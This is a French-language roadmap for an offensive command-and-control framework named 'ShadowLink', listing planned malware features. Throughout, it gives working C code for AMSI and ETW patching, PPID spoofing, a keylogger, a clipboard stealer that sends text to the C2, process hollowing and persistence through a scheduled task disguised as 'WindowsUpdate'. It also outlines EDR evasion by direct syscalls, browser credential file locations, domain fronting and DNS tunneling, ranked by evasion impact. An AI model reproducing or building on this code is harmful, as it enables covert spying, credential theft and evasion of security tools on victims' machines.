# 🚀 ShadowLink - Futures Améliorations

Ce document liste toutes les fonctionnalités et techniques qui pourraient être implémentées dans les versions futures.

---

## 📋 Table des Matières

1. [Évasion Avancée](#évasion-avancée)
2. [Communication](#communication)
3. [Post-Exploitation](#post-exploitation)
4. [Persistence Avancée](#persistence-avancée)
5. [Payload Generation](#payload-generation)
6. [Infrastructure](#infrastructure)

---

## 🛡️ Évasion Avancée

### Niveau 1 - String Encryption Complète

**Status:** ⏳ Non implémenté

Chiffrer TOUTES les chaînes sensibles avec XOR ou AES:
- Noms de commandes ("cmd.exe", "powershell.exe")
- Clés de registre
- Messages d'erreur
- Noms d'API

```c
// Exemple de ce qu'il faudrait chiffrer
const char *cmd = decrypt_string(encrypted_cmd, sizeof(encrypted_cmd));
```

### Niveau 2 - Direct Syscalls

**Status:** ⏳ Non implémenté

Appeler directement les syscalls Windows pour bypasser les hooks EDR:

```c
// Au lieu de:
NtAllocateVirtualMemory(...);  // Hooké par EDR

// Utiliser:
NTSTATUS status;
__asm {
    mov r10, rcx
    mov eax, 0x18  // Syscall number
    syscall
}
```

**APIs à remplacer:**
- `NtAllocateVirtualMemory`
- `NtWriteVirtualMemory`
- `NtCreateThreadEx`
- `NtOpenProcess`
- `NtProtectVirtualMemory`

### Niveau 3 - API Hashing Complet

**Status:** 🔶 Partiellement implémenté

Résoudre TOUTES les APIs dynamiquement via hash djb2:

```c
// Charger kernel32.dll et résoudre CreateProcessA par hash
typedef BOOL (WINAPI *pCreateProcessA)(...);
pCreateProcessA _CreateProcessA = (pCreateProcessA)resolve_api_by_hash(kernel32, 0x12345678);
```

### Niveau 4 - AMSI Bypass

**Status:** ⏳ Non implémenté

Patcher AmsiScanBuffer pour désactiver Windows Defender:

```c
void bypass_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    void *addr = GetProcAddress(amsi, "AmsiScanBuffer");
    
    DWORD oldProtect;
    VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: xor eax, eax; ret
    memcpy(addr, "\x31\xc0\xc3", 3);
    
    VirtualProtect(addr, 6, oldProtect, &oldProtect);
}
```

### Niveau 5 - ETW Patching

**Status:** ⏳ Non implémenté

Désactiver Event Tracing for Windows:

```c
void patch_etw() {
    void *addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: ret
    *(BYTE*)addr = 0xC3;
    
    VirtualProtect(addr, 1, oldProtect, &oldProtect);
}
```

### Niveau 6 - Unhooking ntdll.dll

**Status:** ⏳ Non implémenté

Restaurer ntdll.dll original depuis le disque pour supprimer les hooks EDR:

```c
void unhook_ntdll() {
    // 1. Mapper une copie fraîche de ntdll depuis C:\Windows\System32\ntdll.dll
    // 2. Copier la section .text vers la ntdll en mémoire
    // 3. Les hooks EDR sont supprimés
}
```

### Niveau 7 - Sleep Obfuscation

**Status:** ⏳ Non implémenté

Chiffrer la mémoire pendant le sleep pour éviter les scans:

```c
void obfuscated_sleep(DWORD ms) {
    // 1. Chiffrer toute la section .data avec XOR
    // 2. Changer les permissions mémoire en NO_ACCESS
    // 3. Sleep
    // 4. Restaurer permissions
    // 5. Déchiffrer
}
```

### Niveau 8 - PPID Spoofing

**Status:** ⏳ Non implémenté

Créer des processus avec un faux parent pour éviter la détection:

```c
void create_spoofed_process(DWORD parent_pid, char *cmd) {
    STARTUPINFOEXA si;
    SIZE_T size;
    
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = malloc(size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, 
        (STARTUPINFOA*)&si, &pi);
}
```

---

## 📡 Communication

### HTTP/HTTPS C2

**Status:** ⏳ Non implémenté

Remplacer TCP brut par HTTP/HTTPS pour se fondre dans le trafic légitime:

```
Agent -> POST /api/beacon HTTP/1.1
         Host: legitimate-looking-domain.com
         Content-Type: application/json
         
         {"data": "<encrypted_base64>"}

Server <- HTTP/1.1 200 OK
          {"cmd": "<encrypted_base64>"}
```

**Avantages:**
- Passe les firewalls
- Ressemble à du trafic web légitime
- Peut utiliser des CDN

### Domain Fronting

**Status:** ⏳ Non implémenté

Utiliser des CDN (CloudFlare, Azure, AWS) pour masquer le vrai C2:

```
Connexion TLS à: cdn.microsoft.com
Header Host: real-c2-server.com
```

Le trafic semble aller vers Microsoft mais atteint notre C2.

### DNS Tunneling

**Status:** ⏳ Non implémenté

Utiliser les requêtes DNS comme canal de communication:

```
Agent: query TXT data.c2domain.com
       (données encodées en base64 dans le sous-domaine)

Server: réponse TXT avec commandes encodées
```

**Avantages:**
- DNS rarement bloqué
- Difficile à détecter
- Fonctionne même avec proxy restrictif

### Jitter Implementation

**Status:** ⏳ Non implémenté

Ajouter un délai aléatoire entre les beacons:

```c
#define BEACON_INTERVAL 60000  // 60 secondes
#define JITTER_PERCENT 30      // +/- 30%

int get_jittered_delay() {
    int jitter = (BEACON_INTERVAL * JITTER_PERCENT) / 100;
    return BEACON_INTERVAL + (rand() % (2 * jitter)) - jitter;
}
```

### Encrypted DNS (DoH/DoT)

**Status:** ⏳ Non implémenté

Utiliser DNS over HTTPS pour les résolutions:

```c
// Résoudre le C2 via DoH
// POST https://cloudflare-dns.com/dns-query
// Évite l'inspection DNS
```

---

## 🎯 Post-Exploitation

### Screenshot

**Status:** ⏳ Non implémenté

```c
int take_screenshot(char *output_path) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Sauvegarder en BMP/PNG
    save_bitmap(hBitmap, output_path);
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}
```

### Keylogger

**Status:** ⏳ Non implémenté

```c
HHOOK hKeyboardHook;
FILE *logFile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        // Logger la touche
        fprintf(logFile, "%c", kbStruct->vkCode);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void start_keylogger() {
    logFile = fopen("keys.log", "a");
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
```

### Clipboard Monitor

**Status:** ⏳ Non implémenté

```c
void monitor_clipboard() {
    char last_clip[4096] = {0};
    
    while (1) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)GlobalLock(hData);
                if (text && strcmp(text, last_clip) != 0) {
                    strcpy(last_clip, text);
                    // Exfiltrer le contenu
                    send_to_c2(text);
                }
                GlobalUnlock(hData);
            }
            CloseClipboard();
        }
        Sleep(1000);
    }
}
```

### Webcam Capture

**Status:** ⏳ Non implémenté

Utiliser DirectShow ou Media Foundation pour capturer la webcam.

### Audio Recording

**Status:** ⏳ Non implémenté

Utiliser waveIn API ou WASAPI pour enregistrer le microphone.

### Browser Credential Extraction

**Status:** ⏳ Non implémenté

- Chrome: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
- Firefox: `%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json`
- Edge: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`

### Privilege Escalation

**Status:** ⏳ Non implémenté

Techniques:
- UAC Bypass (fodhelper, eventvwr)
- Token Impersonation
- Named Pipe Impersonation
- Service exploitation
- DLL Hijacking

### Process Injection Techniques

**Status:** ⏳ Non implémenté

1. **Classic DLL Injection**
2. **Process Hollowing**
3. **Thread Hijacking**
4. **APC Injection**
5. **Early Bird Injection**

```c
// Process Hollowing exemple
void process_hollowing(char *target, unsigned char *payload, size_t size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    CreateProcessA(target, NULL, NULL, NULL, FALSE, 
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Unmapper l'image originale
    NtUnmapViewOfSection(pi.hProcess, imageBase);
    
    // Allouer et écrire le payload
    VirtualAllocEx(pi.hProcess, imageBase, size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, imageBase, payload, size, NULL);
    
    // Modifier le contexte et reprendre
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
}
```

---

## 🔒 Persistence Avancée

### Scheduled Tasks

**Status:** ⏳ Non implémenté

```c
void create_scheduled_task() {
    system("schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\path\\agent.exe\" "
           "/sc onlogon /ru SYSTEM /f");
}
```

### WMI Event Subscription

**Status:** ⏳ Non implémenté

Persistence via WMI qui survit aux redémarrages et est difficile à détecter.

### COM Hijacking

**Status:** ⏳ Non implémenté

Remplacer une DLL COM légitime pour être chargé par des applications.

### DLL Search Order Hijacking

**Status:** ⏳ Non implémenté

Placer une DLL malveillante dans un répertoire prioritaire.

### AppInit_DLLs

**Status:** ⏳ Non implémenté

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
AppInit_DLLs = C:\path\malicious.dll
```

### Bootkit/Rootkit

**Status:** ⏳ Non implémenté (très avancé)

Modifier le MBR/VBR ou installer un driver kernel.

---

## 🏭 Payload Generation

### Polymorphic Engine

**Status:** ⏳ Non implémenté

Générer des variants uniques à chaque compilation:
- Changer l'ordre des fonctions
- Insérer du code mort
- Changer les noms de variables
- Modifier les opcodes équivalents

### Shellcode Generation

**Status:** ⏳ Non implémenté

Compiler l'agent en shellcode position-independent.

### Different Output Formats

**Status:** ⏳ Non implémenté

- EXE
- DLL
- PowerShell
- C# Assembly
- VBA Macro
- HTA
- JS/VBS

### Packer/Crypter

**Status:** ⏳ Non implémenté

Chiffrer le payload et le déchiffrer au runtime.

---

## 🏗️ Infrastructure

### Web Interface (GUI)

**Status:** ⏳ Non implémenté

Dashboard web avec:
- Liste des agents en temps réel
- Historique des commandes
- Visualisation réseau
- Gestion des listeners
- Génération de payloads

**Stack suggérée:** Flask/FastAPI + React/Vue

### Team Server

**Status:** ⏳ Non implémenté

Serveur centralisé permettant à plusieurs opérateurs de:
- Partager les agents
- Voir les actions des autres
- Logs d'audit

### Redirectors

**Status:** ⏳ Non implémenté

Serveurs intermédiaires pour masquer le vrai C2:

```
Agent -> Redirector (VPS) -> C2 Server
```

### Malleable C2 Profiles

**Status:** ⏳ Non implémenté

Fichiers de configuration pour personnaliser le trafic réseau:
- Headers HTTP
- URIs
- User-Agents
- Timing

---

## 📊 Priorité d'Implémentation Suggérée

| Priorité | Feature | Difficulté | Impact Évasion |
|----------|---------|------------|----------------|
| 1 | HTTP/HTTPS C2 | Moyenne | ⭐⭐⭐⭐⭐ |
| 2 | String Encryption Complète | Facile | ⭐⭐⭐⭐ |
| 3 | Direct Syscalls | Difficile | ⭐⭐⭐⭐⭐ |
| 4 | Process Injection | Difficile | ⭐⭐⭐⭐⭐ |
| 5 | AMSI Bypass | Moyenne | ⭐⭐⭐⭐ |
| 6 | Screenshot/Keylogger | Facile | ⭐⭐ |
| 7 | Web Interface | Moyenne | ⭐ |
| 8 | Domain Fronting | Difficile | ⭐⭐⭐⭐⭐ |

---

## 📚 Ressources

- [Red Team Notes](https://www.ired.team/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- [Maldev Academy](https://maldevacademy.com/)
- [Sektor7 Courses](https://institute.sektor7.net/)
